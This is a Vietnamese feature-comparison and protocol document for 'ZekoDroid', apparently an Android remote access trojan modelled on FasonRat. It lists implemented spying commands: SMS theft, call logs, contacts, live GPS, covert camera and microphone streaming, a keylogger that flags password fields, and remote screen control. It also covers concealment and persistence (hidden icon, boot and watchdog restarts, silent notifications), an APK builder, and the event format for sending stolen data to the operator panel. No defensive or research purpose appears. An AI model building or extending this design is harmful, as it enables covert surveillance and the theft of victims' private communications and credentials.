# Module — đối chiếu đủ bộ FasonRat

| Module FasonRat | ZekoDroid | Ghi chú |
|---|---|---|
| Device info | ✅ `info` | model/hãng/Android/ABI/CPU/RAM/pin/SIM/IP/storage/rooted |
| Real-time connection | ✅ TCP + reconnect + watchdog | không dùng Socket.IO |
| Multi-device | ✅ panel danh sách | SQLite lưu agent |
| IP geolocation | ⬜ | cần API ngoài (ip-api) — chưa gọi để tránh phụ thuộc |
| SMS read/send | ✅ `sms`, `sms_send` | |
| SMS realtime push | ✅ `SmsReceiver` → evt `sms` | như FasonRat |
| Call logs | ✅ `calllog` | |
| Contacts | ✅ `contacts` | |
| GPS realtime | ✅ `loc_live` → evt `location` mỗi N giây | |
| File manager | ✅ `ls/download/upload/rm/rename/mkdir` | |
| File encrypt/decrypt | ✅ `file_enc/file_dec` (AES-256-CBC) | |
| Camera ảnh | ✅ `cam_shot` | Camera2 |
| Camera live stream | ✅ `stream_start kind=cam` | push frame, fps/quality |
| Camera quay video | ✅ `video {seconds}` | Camera2 + MediaRecorder → mp4 |
| Mic record | ✅ `mic` | MediaRecorder AAC |
| Mic live | ✅ `mic_live` (PCM16 → WebAudio trong panel) | khác FasonRat (nó dùng PCM thô qua socket) |
| Clipboard | ✅ `clipboard` | |
| Clipboard realtime | ✅ `clip_live` → evt `clipboard` | |
| Notifications | ✅ `notifs` | NotificationListener |
| WiFi scanner | ✅ `wifi_scan` | |
| Installed apps | ✅ `apps` | |
| Permissions viewer | ✅ `permissions` | FasonRat có "prompt missing" — mình chỉ xem |
| HVNC (xem + điều khiển) | ✅ `stream_start kind=screen` + `tap/swipe/click_text` | |
| Inspector (accessibility tree) | ✅ `inspector` | |
| Keylogger | ✅ `keylog_dump` + evt keylog 20s | có cờ PASSWORD |
| Unlock / PIN injection | ⬜ | cần Accessibility + rủi ro; chưa làm |
| Hidden icon | ✅ `hide_icon/show_icon` | |
| Screen on/off | ✅ `ScreenStateReceiver` → evt `screen_state` | |
| Auto boot | ✅ `BootReceiver` | |
| Watchdog | ✅ `AlarmManager` 15 phút | |
| Keep-alive job | ✅ `KeepAliveJob` (JobScheduler, persisted) | thay WorkManager |
| Stealth notification | ✅ notification IMPORTANCE_MIN, không badge | |
| APK builder trên panel | ✅ nút Builder, ký v2 thuần .NET | xem docs/BUILDER.md |
| Multi-user / RBAC | ✅ 3 role, 9 quyền | xem docs/RBAC.md |
| Logs | ✅ tab Quản trị → Logs (300 dòng) | login/cmd/builder/user/session |
| Sessions | ✅ tab Quản trị → Sessions + thu hồi | lưu DB, 12h |

## Protocol event realtime

Agent push `{t:"evt", cmd:"<type>", data:{...}}`, server lưu ring 300 event/agent,
panel poll `GET /api/agents/{hwid}/events?since=<seq>` → `{seq, items[]}`.

| type | data |
|---|---|
| `sms` | `{from, body, time, type}` |
| `location` | `{lat, lon, acc, speed, time, map}` |
| `clipboard` | `{text}` |
| `audio` | `{rate, pcm(base64 PCM16 mono)}` |
| `screen_state` | `{state: on/off/unlocked}` |
| `frame` | `{kind: screen/cam, jpeg}` (không vào ring, vào FrameHub) |
| `keylog` | `{text}` |